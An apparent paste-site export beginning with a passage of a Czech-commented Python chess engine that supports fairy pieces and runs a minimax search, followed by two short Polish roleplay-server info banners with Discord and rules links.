            col_idx = 0
            for char in row:
                if col_idx >= 8:  # Ochrana proti překročení sloupců
                    break
                if char.isdigit():
                    # Prázdná pole
                    empty_squares = int(char)
                    for _ in range(empty_squares):
                        if col_idx < 8:
                            self.board[row_idx][col_idx] = ''
                            col_idx += 1
                else:
                    self.board[row_idx][col_idx] = char
                    col_idx += 1
        
        # Na tahu
        self.white_to_move = parts[1] == 'w'
        
        # Rošáda
        castling = parts[2] if len(parts) > 2 else '-'
        self.castling_rights = {
            'K': 'K' in castling,
            'Q': 'Q' in castling,
            'k': 'k' in castling,
            'q': 'q' in castling
        }
        
        # En passant
        self.en_passant = parts[3] if len(parts) > 3 and parts[3] != '-' else None
        
        # Počet tahů
        self.halfmove_clock = int(parts[4]) if len(parts) > 4 else 0
        self.fullmove_number = int(parts[5]) if len(parts) > 5 else 1
        
    def to_fen(self) -> str:
        """"""Převede aktuální pozici na FEN string""""""
        # Pozice
        fen_rows = []
        for row in self.board:
            fen_row = ''
            empty_count = 0
            for cell in row:
                if cell == '':
                    empty_count += 1
                else:
                    if empty_count > 0:
                        fen_row += str(empty_count)
                        empty_count = 0
                    fen_row += cell
            if empty_count > 0:
                fen_row += str(empty_count)
            fen_rows.append(fen_row)
        
        board_fen = '/'.join(fen_rows)
        
        # Na tahu
        active_color = 'w' if self.white_to_move else 'b'
        
        # Rošáda
        castling = ''
        if self.castling_rights['K']: castling += 'K'
        if self.castling_rights['Q']: castling += 'Q'
        if self.castling_rights['k']: castling += 'k'
        if self.castling_rights['q']: castling += 'q'
        if not castling: castling = '-'
        
        # En passant
        en_passant = self.en_passant if self.en_passant else '-'
        
        return f""{board_fen} {active_color} {castling} {en_passant} {self.halfmove_clock} {self.fullmove_number}""
    
    def print_board(self):
        """"""Vypíše šachovnici v ASCII formátu""""""
        print(""  a b c d e f g h"")
        for i in range(8):
            print(f""{8-i} "", end="""")
            for j in range(8):
                piece = self.board[i][j]
                if piece == '':
                    piece = '.'
                print(f""{piece} "", end="""")
            print(f""{8-i}"")
        print(""  a b c d e f g h"")
        print()
    
    def is_white_piece(self, piece: str) -> bool:
        """"""Zjistí, zda je figura bílá""""""
        return piece.isupper()
    
    def get_piece_moves(self, row: int, col: int, check_castling: bool = True) -> List[Tuple[int, int]]:
        """"""Získá všechny možné tahy pro figuru na dané pozici""""""
        piece = self.board[row][col]
        if piece == '':
            return []
        
        piece_type = piece.lower()
        is_white = self.is_white_piece(piece)
        moves = []
        
        if piece_type == 'p':
            # Pěšec
            direction = -1 if is_white else 1
            start_row = 6 if is_white else 1
            
            # Tah dopředu
            if 0 <= row + direction < 8 and self.board[row + direction][col] == '':
                moves.append((row + direction, col))
                # Dvojitý tah z počáteční pozice
                if row == start_row and self.board[row + 2 * direction][col] == '':
                    moves.append((row + 2 * direction, col))
            
            # Braní úhlopříčně
            for dc in [-1, 1]:
                new_row, new_col = row + direction, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target != '' and self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
                    # En passant
                    elif self.en_passant and self.en_passant == f""{chr(ord('a') + new_col)}{8 - new_row}"":
                        moves.append((new_row, new_col))
        
        elif piece_type == 'r':
            # Věž
            directions = [(0, 1), (0, -1), (1, 0), (-1, 0)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
        
        elif piece_type == 'n':
            # Kůň
            knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1), (1, 2), (1, -2), (-1, 2), (-1, -2)]
            for dr, dc in knight_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
        
        elif piece_type == 'b':
            # Střelec
            directions = [(1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
        
        elif piece_type == 'q':
            # Dáma
            directions = [(0, 1), (0, -1), (1, 0), (-1, 0), (1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
        
        elif piece_type == 'k':
            # Král
            king_moves = [(0, 1), (0, -1), (1, 0), (-1, 0), (1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in king_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
            
            # Rošáda - pouze pokud je povoleno kontrolovat (vyhneme se rekurzi)
            if check_castling and not self.is_in_check(is_white):
                # Krátká rošáda
                castling_key = 'K' if is_white else 'k'
                if self.castling_rights[castling_key]:
                    if (self.board[row][col + 1] == '' and self.board[row][col + 2] == '' and
                        not self.is_square_attacked(row, col + 1, not is_white) and
                        not self.is_square_attacked(row, col + 2, not is_white)):
                        moves.append((row, col + 2))
                
                # Dlouhá rošáda
                castling_key = 'Q' if is_white else 'q'
                if self.castling_rights[castling_key]:
                    if (self.board[row][col - 1] == '' and self.board[row][col - 2] == '' and
                        self.board[row][col - 3] == '' and
                        not self.is_square_attacked(row, col - 1, not is_white) and
                        not self.is_square_attacked(row, col - 2, not is_white)):
                        moves.append((row, col - 2))
        
        elif piece_type == 'a':  # Amazonka (kůň + dáma)
            # Tahy dámy
            directions = [(0, 1), (0, -1), (1, 0), (-1, 0), (1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
            # Tahy koně
            knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1), (1, 2), (1, -2), (-1, 2), (-1, -2)]
            for dr, dc in knight_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
        
        elif piece_type == 'c':  # Cyril (kůň + věž)
            # Tahy věže
            directions = [(0, 1), (0, -1), (1, 0), (-1, 0)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
            # Tahy koně
            knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1), (1, 2), (1, -2), (-1, 2), (-1, -2)]
            for dr, dc in knight_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
        
        elif piece_type == 'e':  # Eve (kůň + střelec)
            # Tahy střelce
            directions = [(1, 1), (1, -1), (-1, 1), (-1, -1)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
            # Tahy koně
            knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1), (1, 2), (1, -2), (-1, 2), (-1, -2)]
            for dr, dc in knight_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
        
        return moves
    
    def is_square_attacked(self, row: int, col: int, by_white: bool) -> bool:
        """"""Zjistí, zda je pole napadené danou barvou""""""
        for r in range(8):
            for c in range(8):
                piece = self.board[r][c]
                if piece != '' and self.is_white_piece(piece) == by_white:
                    # Nekontroluji rošádu při detekci napadení (vyhneme se rekurzi)
                    moves = self.get_piece_moves(r, c, check_castling=False)
                    if (row, col) in moves:
                        return True
        return False
    
    def find_king(self, is_white: bool) -> Tuple[int, int]:
        """"""Najde krále dané barvy""""""
        king = 'K' if is_white else 'k'
        for r in range(8):
            for c in range(8):
                if self.board[r][c] == king:
                    return (r, c)
        return (-1, -1)  # Král nenalezen
    
    def is_in_check(self, is_white: bool) -> bool:
        """"""Zjistí, zda je král v šachu""""""
        king_pos = self.find_king(is_white)
        if king_pos == (-1, -1):
            return False
        return self.is_square_attacked(king_pos[0], king_pos[1], not is_white)
    
    def make_move(self, from_pos: Tuple[int, int], to_pos: Tuple[int, int]) -> bool:
        """"""Provede tah a vrátí True, pokud je legální""""""
        from_row, from_col = from_pos
        to_row, to_col = to_pos
        
        piece = self.board[from_row][from_col]
        if piece == '':
            return False
        
        is_white = self.is_white_piece(piece)
        if is_white != self.white_to_move:
            return False
        
        # Zkontroluj, zda je tah v seznamu možných tahů
        possible_moves = self.get_piece_moves(from_row, from_col)
        if (to_row, to_col) not in possible_moves:
            return False
        
        # Ulož původní stav
        original_board = copy.deepcopy(self.board)
        original_castling = copy.deepcopy(self.castling_rights)
        original_en_passant = self.en_passant
        
        # Proveď tah
        captured_piece = self.board[to_row][to_col]
        self.board[to_row][to_col] = piece
        self.board[from_row][from_col] = ''
        
        # Speciální tahy
        piece_type = piece.lower()
        
        # En passant
        if piece_type == 'p' and self.en_passant and f""{chr(ord('a') + to_col)}{8 - to_row}"" == self.en_passant:
            if is_white:
                self.board[to_row + 1][to_col] = ''
            else:
                self.board[to_row - 1][to_col] = ''
        
        # Rošáda
        if piece_type == 'k' and abs(to_col - from_col) == 2:
            if to_col > from_col:  # Krátká rošáda
                self.board[from_row][7] = ''
                self.board[from_row][5] = 'R' if is_white else 'r'
            else:  # Dlouhá rošáda
                self.board[from_row][0] = ''
                self.board[from_row][3] = 'R' if is_white else 'r'
        
        # Aktualizace en passant
        if piece_type == 'p' and abs(to_row - from_row) == 2:
            self.en_passant = f""{chr(ord('a') + from_col)}{8 - (from_row + to_row) // 2}""
        else:
            self.en_passant = None
        
        # Aktualizace rošádových práv
        if piece_type == 'k':
            if is_white:
                self.castling_rights['K'] = False
                self.castling_rights['Q'] = False
            else:
                self.castling_rights['k'] = False
                self.castling_rights['q'] = False
        elif piece_type == 'r':
            if from_row == 0 or from_row == 7:
                if from_col == 0:
                    key = 'Q' if from_row == 7 else 'q'
                    self.castling_rights[key] = False
                elif from_col == 7:
                    key = 'K' if from_row == 7 else 'k'
                    self.castling_rights[key] = False
        
        # Zkontroluj, zda vlastní král není v šachu
        if self.is_in_check(is_white):
            # Vrať původní stav
            self.board = original_board
            self.castling_rights = original_castling
            self.en_passant = original_en_passant
            return False
        
        # Tah je legální
        self.white_to_move = not self.white_to_move
        if not self.white_to_move:
            self.fullmove_number += 1
        
        if captured_piece or piece_type == 'p':
            self.halfmove_clock = 0
        else:
            self.halfmove_clock += 1
        
        return True
    
    def undo_move(self, from_pos: Tuple[int, int], to_pos: Tuple[int, int], 
                  captured_piece: str, old_castling: dict, old_en_passant: str,
                  old_halfmove: int, old_fullmove: int, was_white_to_move: bool):
        """"""Vrátí tah zpět""""""
        from_row, from_col = from_pos
        to_row, to_col = to_pos
        
        piece = self.board[to_row][to_col]
        self.board[from_row][from_col] = piece
        self.board[to_row][to_col] = captured_piece
        
        # Vrácení speciálních tahů
        piece_type = piece.lower()
        
        # Rošáda
        if piece_type == 'k' and abs(to_col - from_col) == 2:
            if to_col > from_col:  # Krátká rošáda
                self.board[from_row][7] = 'R' if self.is_white_piece(piece) else 'r'
                self.board[from_row][5] = ''
            else:  # Dlouhá rošáda
                self.board[from_row][0] = 'R' if self.is_white_piece(piece) else 'r'
                self.board[from_row][3] = ''
        
        # En passant
        if piece_type == 'p' and old_en_passant and f""{chr(ord('a') + to_col)}{8 - to_row}"" == old_en_passant:
            if self.is_white_piece(piece):
                self.board[to_row + 1][to_col] = 'p'
            else:
                self.board[to_row - 1][to_col] = 'P'
        
        self.castling_rights = old_castling
        self.en_passant = old_en_passant
        self.halfmove_clock = old_halfmove
        self.fullmove_number = old_fullmove
        self.white_to_move = was_white_to_move
    
    def get_all_legal_moves(self) -> List[Tuple[Tuple[int, int], Tuple[int, int]]]:
        """"""Získá všechny legální tahy pro aktuálního hráče""""""
        legal_moves = []
        
        for row in range(8):
            for col in range(8):
                piece = self.board[row][col]
                if piece != '' and self.is_white_piece(piece) == self.white_to_move:
                    moves = self.get_piece_moves(row, col)
                    for to_row, to_col in moves:
                        # Zkopíruj stav
                        original_state = self.save_state()
                        
                        # Zkus tah
                        if self.make_move((row, col), (to_row, to_col)):
                            legal_moves.append(((row, col), (to_row, to_col)))
                        
                        # Vrať stav
                        self.restore_state(original_state)
        
        return legal_moves
    
    def save_state(self):
        """"""Uloží aktuální stav hry""""""
        return {
            'board': copy.deepcopy(self.board),
            'white_to_move': self.white_to_move,
            'castling_rights': copy.deepcopy(self.castling_rights),
            'en_passant': self.en_passant,
            'halfmove_clock': self.halfmove_clock,
            'fullmove_number': self.fullmove_number
        }
    
    def restore_state(self, state):
        """"""Obnoví uložený stav hry""""""
        self.board = state['board']
        self.white_to_move = state['white_to_move']
        self.castling_rights = state['castling_rights']
        self.en_passant = state['en_passant']
        self.halfmove_clock = state['halfmove_clock']
        self.fullmove_number = state['fullmove_number']
    
    def get_material_balance(self) -> int:
        """"""Spočítá materiální vyváženost (pozitivní = výhoda bílého)""""""
        balance = 0
        for row in range(8):
            for col in range(8):
                piece = self.board[row][col]
                if piece != '' and piece.lower() != 'k':  # Ignoruj krále
                    balance += self.piece_values.get(piece, 0)
        return balance
    
    def evaluate_position(self) -> int:
        """"""Ohodnotí pozici s lepším rozlišením koncových pozic""""""
        # Rychlá kontrola matu/patu před materiálním hodnocením
        if self.is_checkmate():
            if self.white_to_move:  # Bílý v matu -> černý vyhrál
                return -999999
            else:  # Černý v matu -> bílý vyhrál
                return 999999
                
        elif self.is_stalemate():
            # Pat: ve vítězné pozici je to neúspěch
            material_balance = self.get_material_balance()
            if material_balance > 300:  # Bílý má výhodu -> pat je velmi špatný
                return -10000  
            elif material_balance < -300:  # Černý má výhodu -> pat je velmi dobrý pro bílého
                return 10000
            else:
                return 0  # Vyrovnaná pozice
        
        # Materiální hodnocení
        score = self.get_material_balance()
        
        # Bonus pro pokročilé koncovky - motivace k matu
        if abs(score) > 500:  # Významná materiální výhoda
            # Penalty za vzdálenost králů (v koncovce chceme krále blízko)
            white_king = self.find_king(True)
            black_king = self.find_king(False)
            
            if white_king != (-1, -1) and black_king != (-1, -1):
                king_distance = abs(white_king[0] - black_king[0]) + abs(white_king[1] - black_king[1])
                if score > 0:  # Bílý vede
                    score -= king_distance * 10  # Penalty za vzdálené krále
                else:  # Černý vede
                    score += king_distance * 10
        
        return score
    
    def is_checkmate(self) -> bool:
        """"""Zjistí, zda je mat""""""
        if not self.is_in_check(self.white_to_move):
            return False
        
        legal_moves = self.get_all_legal_moves()
        return len(legal_moves) == 0
    
    def is_stalemate(self) -> bool:
        """"""Zjistí, zda je pat""""""
        if self.is_in_check(self.white_to_move):
            return False
        
        legal_moves = self.get_all_legal_moves()
        return len(legal_moves) == 0
    
    def is_game_over(self) -> Tuple[bool, str]:
        """"""Zjistí, zda je hra u konce""""""
        if self.is_checkmate():
            winner = ""Černý"" if self.white_to_move else ""Bílý""
            return True, f""Mat! Vyhrál {winner}.""
        elif self.is_stalemate():
            return True, ""Pat! Remíza.""
        elif self.halfmove_clock >= 100:
            return True, ""Remíza podle pravidla 50 tahů.""
        
        return False, """"
    
    def minimax(self, depth: int, alpha: int, beta: int, maximizing: bool, 
                path: List[str]) -> Tuple[int, List[str]]:
        """"""Minimax algoritmus s alfa-beta pruningem - OPRAVENO PRO MAT""""""
        
        # Kontrola konce hry
        if self.is_checkmate():
            # Mat: kdo vyhrál?
            if self.white_to_move:  # Bílý je na tahu ale je v matu -> černý vyhrál
                return (-999999 + len(path), path)
            else:  # Černý je na tahu ale je v matu -> bílý vyhrál  
                return (999999 - len(path), path)
                
        elif self.is_stalemate():
            # NOVÁ LOGIKA: Pat je vždy remíza, ale ve vítězné pozici je to selhání
            material_balance = self.get_material_balance()
            
            if material_balance > 300:  # Bílý má výraznou výhodu
                return (-10000, path)  # Pat ve vítězné pozici je velmi špatný pro bílého
            elif material_balance < -300:  # Černý má výraznou výhodu  
                return (10000, path)   # Pat ve vítězné pozici je velmi špatný pro černého
            else:
                return (0, path)  # Vyrovnaná pozice -> pat je OK
                
        elif self.halfmove_clock >= 100:
            return (0, path)
        
        if depth == 0:
            return (self.evaluate_position(), path)
        
        legal_moves = self.get_all_legal_moves()
        
        if maximizing:
            max_eval = float('-inf')
            best_path = path
            
            for move in legal_moves:
                # Ulož stav
                original_state = self.save_state()
                
                # Proveď tah
                self.make_move(move[0], move[1])
                move_notation = f""{chr(ord('a') + move[0][1])}{8 - move[0][0]}-{chr(ord('a') + move[1][1])}{8 - move[1][0]}""
                new_path = path + [move_notation]
                
                eval_score, eval_path = self.minimax(depth - 1, alpha, beta, False, new_path)
                
                if eval_score > max_eval:
                    max_eval = eval_score
                    best_path = eval_path
                
                # Vrať stav
                self.restore_state(original_state)
                
                alpha = max(alpha, eval_score)
                if beta <= alpha:
                    break
            
            return (max_eval, best_path)
        
        else:
            min_eval = float('inf')
            best_path = path
            
            for move in legal_moves:
                # Ulož stav
                original_state = self.save_state()
                
                # Proveď tah
                self.make_move(move[0], move[1])
                move_notation = f""{chr(ord('a') + move[0][1])}{8 - move[0][0]}-{chr(ord('a') + move[1][1])}{8 - move[1][0]}""
                new_path = path + [move_notation]
                
                eval_score, eval_path = self.minimax(depth - 1, alpha, beta, True, new_path)
                
                if eval_score < min_eval:
                    min_eval = eval_score
                    best_path = eval_path
                
                # Vrať stav
                self.restore_state(original_state)
                
                beta = min(beta, eval_score)
                if beta <= alpha:
                    break
            
            return (min_eval, best_path)
    
    def find_best_move(self, max_depth: int = 10) -> Tuple[Optional[List[str]], int]:
        """"""Najde nejlepší tah pomocí iterativního prohloubení""""""
        print(f""Hledání nejlepšího tahu (maximální hloubka: {max_depth})..."")
        print(f""Na tahu: {'Bílý' if self.white_to_move else 'Černý'}"")
        
        # Zkontroluj materiální situaci
        material_balance = self.get_material_balance()
        if material_balance > 300:
            print(f""Bílý má materiální výhodu ({material_balance} bodů) - hledám mat!"")
        elif material_balance < -300:
            print(f""Černý má materiální výhodu ({-material_balance} bodů) - bráním se!"")
        print()
        
        best_path = None
        best_score = 0
        
        for depth in range(1, max_depth + 1):
            # Přidání časového razítka před každou hloubku
            current_time = datetime.now().strftime(""%H:%M:%S"")
            
            start_time = time.time()
            
            # OPRAVA: maximizing musí odpovídat tomu, kdo je na tahu!
            # Bílý maximalizuje (+), černý minimalizuje (-)
            score, path = self.minimax(depth, float('-inf'), float('inf'), self.white_to_move, [])
            
            end_time = time.time()
            elapsed = end_time - start_time
            
            print(f""[{current_time}] Hloubka {depth}: skóre {score}, čas {elapsed:.3f}s"")
            
            best_path = path
            best_score = score
            
            # Pokud byl nalezen mat, skonči
            if abs(score) > 900000:
                print(f""Nalezen mat v {len(path)} tazích!"")
                break
                
            # Pokud je skóre příliš nízké ve vítězné pozici, pokračuj v hledání
            if material_balance > 300 and score < -500:
                print(f""Skóre {score} je příliš nízké pro vítěznou pozici, pokračujem..."")
        
        return best_path, best_score
    
    def play_game(self, initial_fen: str = None, max_depth: int = 6):
        """"""Spustí hru s automatickým hraním""""""
        if initial_fen:
            self.load_fen(initial_fen)
        else:
            # Standardní počáteční pozice
            self.load_fen(""rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1"")
        
        print(""=== ŠACHOVÝ ENGINE S NESTANDARDNÍMI FIGURAMI ==="")
        print(""Legenda figur:"")
        print(""A/a = Amazonka (Kůň + Dáma)"")
        print(""C/c = Cyril (Kůň + Věž)"")
        print(""E/e = Eve (Kůň + Střelec)"")
        print()
        
        print(""Počáteční pozice:"")
        print(f""FEN: {self.to_fen()}"")
        self.print_board()
        
        move_count = 0
        # Historie provedených tahů
        executed_moves = []
        
        while True:
            game_over, result = self.is_game_over()
            if game_over:
                print(result)
                break
            
            move_count += 1
            print(f""\n=== TAH {move_count} ==="")
            
            best_path, score = self.find_best_move(max_depth)
            
            if not best_path:
                print(""Žádný tah nenalezen!"")
                break
            
            # Simuluj celou cestu
            if abs(score) > 900000:
                print(f""\nNalezená cesta k matu ({len(best_path)} tahů):"")
            elif abs(score) > 5000:
                print(f""\nNalezená silná cesta ({len(best_path)} tahů):"")
            elif abs(score) < -5000:
                print(f""\nVarování: Možný pat v {len(best_path)} tazích!"")
            else:
                print(f""\nNalezená cesta ({len(best_path)} tahů):"")
            
            current_engine = ChessEngine()
            current_engine.restore_state(self.save_state())
            
            # Vypíš počáteční pozici
            print(f""\nPočáteční pozice:"")
            print(f""FEN: {current_engine.to_fen()}"")
            current_engine.print_board()
            
            for i, move_notation in enumerate(best_path):
                # Parsuj a proveď tah
                from_pos = (8 - int(move_notation[1]), ord(move_notation[0]) - ord('a'))
                to_pos = (8 - int(move_notation[4]), ord(move_notation[3]) - ord('a'))
                
                if not current_engine.make_move(from_pos, to_pos):
                    print(""Chyba při provádění tahu!"")
                    break
                
                # Teď vypíš pozici PO provedení tahu
                print(f""\nTah {i + 1}: {move_notation}"")
                print(f""FEN: {current_engine.to_fen()}"")
                current_engine.print_board()
                
                game_over, result = current_engine.is_game_over()
                if game_over:
                    print(f""{result}"")
                    return
            
            # Proveď první tah z nalezené cesty
            if best_path:
                first_move = best_path[0]
                from_pos = (8 - int(first_move[1]), ord(first_move[0]) - ord('a'))
                to_pos = (8 - int(first_move[4]), ord(first_move[3]) - ord('a'))
                
                # Zapamatuj si, kdo hraje před tahem
                current_player = ""Bílý"" if self.white_to_move else ""Černý""
                
                if self.make_move(from_pos, to_pos):
                    # Přidej tah do historie
                    executed_moves.append(first_move)
                    
                    print(f""\nProveden tah: {first_move} ({current_player})"")
                    
                    # Vytiskni celou historii tahů s číslováním
                    print(f""\nCelá historie tahů ({len(executed_moves)} tahů):"")
                    history_display = []
                    for i, move in enumerate(executed_moves):
                        if i % 2 == 0:  # Bílý tah
                            move_number = (i // 2) + 1
                            history_display.append(f""{move_number}.{move}"")
                        else:  # Černý tah
                            history_display.append(move)
                    
                    # Rozděl do řádků po 6 tazích (3 páry)
                    for i in range(0, len(history_display), 6):
                        chunk = history_display[i:i+6]
                        print("" "".join(chunk))
                else:
                    print(""Chyba při provádění prvního tahu!"")
                    break
            else:
                break

# Spuštění enginu
if __name__ == ""__main__"":
    engine = ChessEngine()
    
    # Testovací pozice - zajímavější matový problém
    # Černý král v rohu, bílá Amazonka a král pro demonstraci síly Amazonky
    test_fen = ""k7/8/2A5/8/8/8/8/K7 w - - 0 1""
    test_fen = ""7A/8/8/8/8/8/6k1/1K6 w - - 0 1""

    test_fen = ""8/8/8/8/8/5BN1/5K1k/8 b - - 0 1""

    test_fen = ""8/8/8/5N2/8/5B1k/5K2/8 b - - 0 1""

    test_fen = ""8/8/8/8/A7/4c1k1/8/6K1 w - - 0 1""
    
    print(f""Používám testovací pozici: {test_fen}"")
    print(""Pozice: Střelec na f3, Kůň na g3, Bílý král na f2, Černý král na h2"")
    engine.play_game(test_fen, max_depth=6)"
6DxG481S,Untitled,Goriec,HTML,Monday 21st of July 2025 04:18:48 PM CDT,"                         <size=55><color=#C50000>「</color><color=#FABCBF>P</color><color=#FB7F81>L</color><color=#FABCBF>」</color></size><b><size=55><color=#00B7EB>O</color><color=#00B7EB>ś</color><color=#00FFFF>r</color><color=#00FFFF>o</color><color=#00B7EB>d</color><color=#00B7EB>e</color><color=#00FFFF>k</color> 19
_________________________
             <size=200%><color=blue>INFORMACJE</color>
     <size=150%>Discord <link=""https://discord.gg/xPnUYTaJ7c""><color=red><u>Ośrodek-19 HARD RP</u></color></link></size>
     <size=150%>Regulamin <link=""https://docs.google.com/document/d/1CELQM5qKivXPpjL58nZslN4hqXETngLtXr_vrdy1F-M/edit?tab=t.w6xeasfou8bs""><color=#00ff00><u>Google Docs</u></color></link></size>
     <size=150%>Kontakt:<color=yellow> t48970990@gmail.com</color>
 
======================================"
cZFjp8Xr,Untitled,Goriec,HTML,Monday 21st of July 2025 04:16:59 PM CDT,"                            <size=55><color=#C50000>「</color><color=#FABCBF>P</color><color=#FB7F81>L</color><color=#FABCBF>」</color></size><b><size=55><color=#00B7EB>O</color><color=#00B7EB>ś</color><color=#00FFFF>r</color><color=#00FFFF>o</color><color=#00B7EB>d</color><color=#00B7EB>e</color><color=#00FFFF>k</color> 19
_________________________
              <size=200%><color=blue>INFORMACJE</color>
       <size=150%>Discord <link=""https://discord.gg/xPnUYTaJ7c""><color=red><u>Ośrodek-19 HARD RP</u></color></link></size>
       <size=150%>Regulamin <link=""https://docs.google.com/document/d/1CELQM5qKivXPpjL58nZslN4hqXETngLtXr_vrdy1F-M/edit?tab=t.w6xeasfou8bs""><color=#00ff00><u>Google Docs</u></color></link></size>
     <size=150%>Kontakt:<color=yellow> t48970990@gmail.com</color>
 
========================================"
